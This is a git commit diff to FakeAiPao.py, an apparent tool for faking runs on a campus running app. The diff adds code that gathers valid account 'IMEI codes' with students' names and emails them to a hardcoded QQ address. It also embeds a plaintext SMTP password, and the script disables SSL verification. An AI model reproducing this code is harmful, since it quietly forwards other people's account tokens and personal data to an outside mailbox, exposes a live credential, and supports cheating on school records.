25066adcc1a1298f957f41214727c9582527ced2
SpadeAce <52764058+lagomerH@users.noreply.github.com>
2021-04-03 09:04:16 +0800

    Update FakeAiPao.py

--- FakeAiPao.py
+++ FakeAiPao.py
@@ -10,6 +10,14 @@ import os
 import requests
 import ssl
 ssl._create_default_https_context = ssl._create_unverified_context
+#设置邮箱发送
+import smtplib
+from email.mime.text import MIMEText
+mail_host = 'smtp.163.com'
+mail_user = 'luckyhui2000'
+mail_pass = 'JTPJVBDOKHEXRQEX'
+sender = 'luckyhui2000@163.com'
+receivers = ['76946112@qq.com']
 
 
 def load_local_imei_code(file_name='code.txt') -> list:
@@ -28,6 +36,9 @@ def check(code) -> bool:
     check_json = requests.get('https://aipao.liaoguoyin.com/check', verify=False,
                               params={'code': code, 'imei': 'Public-Gist'}).json()
     if check_json.get('code') == 200:
+        global s
+        s += f'{code} 有效，姓名: {check_json.get("data").get("name")}'
+        s+="\n"
         print(f'{code} 有效，姓名: {check_json.get("data").get("name")}')
         return True
     else:
@@ -54,6 +65,7 @@ if __name__ == '__main__':
     code_list = load_local_imei_code()
     print('*' * 50)
 
+    s = ""
     code_count = len(code_list)
     valid_code_count = 0
     valid_code_list = []
@@ -63,7 +75,26 @@ if __name__ == '__main__':
         if check(code):
             valid_code_count += 1
             valid_code_list.append(code)
-
+    message = MIMEText(s,'plain','utf-8')
+    #邮件主题
+    message['Subject'] = '今日有效IMEICODE'
+    message['From'] = sender
+    message['To'] = receivers[0]
+    try:
+        smtpObj = smtplib.SMTP() 
+        #连接到服务器
+        smtpObj.connect(mail_host,25)
+        #登录到服务器
+        smtpObj.login(mail_user,mail_pass) 
+        #发送
+        smtpObj.sendmail(
+            sender,receivers,message.as_string()) 
+        #退出
+        smtpObj.quit() 
+        print('success')
+    except smtplib.SMTPException as e:
+        print('error',e) #打印错误
+                  
     print('*' * 50)
     print(f'共计 IMEICode {code_count} 个，有效 {valid_code_count} 个')
     #is_quit = input('按 Q 退出程序，输入其他任意字母开始跑步')
